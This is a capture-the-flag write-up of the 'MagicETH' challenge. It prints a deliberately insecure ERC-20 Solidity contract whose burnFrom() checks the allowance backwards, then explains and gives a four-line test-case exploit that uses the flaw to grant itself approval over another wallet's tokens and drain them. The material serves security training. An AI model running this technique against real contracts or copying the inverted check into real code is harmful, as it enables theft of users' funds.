# MagicETH

## Challenge

As this challenge is the first of the whole CTF/Workshop it is very simple. We are only provided with one contract, which is an ERC-20:

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

/**
 * @title MagicETH: The Insecure Wrapped Ether   
 */
contract MagicETH is ERC20("Magic insecure ETH", "mETH") {
    
    /**
     * @notice Deposit ether to get wrapped ether
     */
    function deposit() public payable {
        _mint(msg.sender, msg.value);
    }

    /**
     * @notice Withdraw, burn Magic Ether to get Ether
     */
    function withdraw(uint256 amount) external {
        // _value is the amount of ether to withdraw
        uint256 _value = address(this).balance * amount / totalSupply();

        _burn(msg.sender, amount);

        (bool success,) = msg.sender.call{value: _value}("");
        require(success, "ETH transfer failed");
    }

    /**
     * @dev Burn Magic Ether
     */
    function burnFrom(address account, uint256 amount) public {
        uint256 currentAllowance = allowance(msg.sender, account);
        require(currentAllowance >= amount, "ERC20: insufficient allowance");

        // decrease allowance
        _approve(account, msg.sender, currentAllowance - amount);

        // burn
        _burn(account, amount);
    }
}
```

Challenge Description:
A prominent protocol, InsecStar, finds itself under attack. Their token, MagicETH (mETH), has been drained through an exploit in their borrow & loan protocol.

InsecStar has urgently summoned you to devise a method to recover the stolen tokens and redeem them for ETH before the situation worsens. This is a critical test of your capabilities. Can you rise to the occasion and secure the tokens, thereby reinforcing the strength and resilience of the Ethereum ecosystem?

📌 Recover `1000 mETH` from the *exploiter wallet*.

📌 Convert the `mETH` to `ETH` to avoid further losses.

## Solution

The problem here is that the check in the burnFrom() function is messed up. Instead of checking if the person we are burning from has given us an allowance, it checks if we have given an allowance to that person, which we can always do.

```solidity
uint256 currentAllowance = allowance(msg.sender, account);
```

This alone is already pretty bad as it allows us to burn anyone else's tokens, but doesn't help us in stealing their tokens. The part that enables us to do this is that afterward it does the check the opposite way and sets the new allowance of our target -> us, to our allowance to the target minus the amount we burned.

```solidity
_approve(account, msg.sender, currentAllowance - amount);
```

So we can also create arbitrary approvals from others to ourselves.

So we only have to do a few steps to solve this:
1. Approve the exploiter for 1000 ether
2. Exploit the wrong check in burnFrom() to generate an allowance of all his tokens for ourself
3. Transfer the tokens to ourself
4. Withdraw

I implemented this in 4 LOC in the Testcase:

```solidity
//First we approve then exploiter for all the money
mETH.approve(exploiter, 1000 ether);

//Then we exploit the wrong check in burnFrom() to generate an allowance of all his tokens to ourself
mETH.burnFrom(exploiter, 0);

//Now we transfer the tokens to ourself
mETH.transferFrom(exploiter, whitehat, 1000 ether);

//Withdraw & done
mETH.withdraw(1000 ether);
```

This passes the testcase & solves the challenge.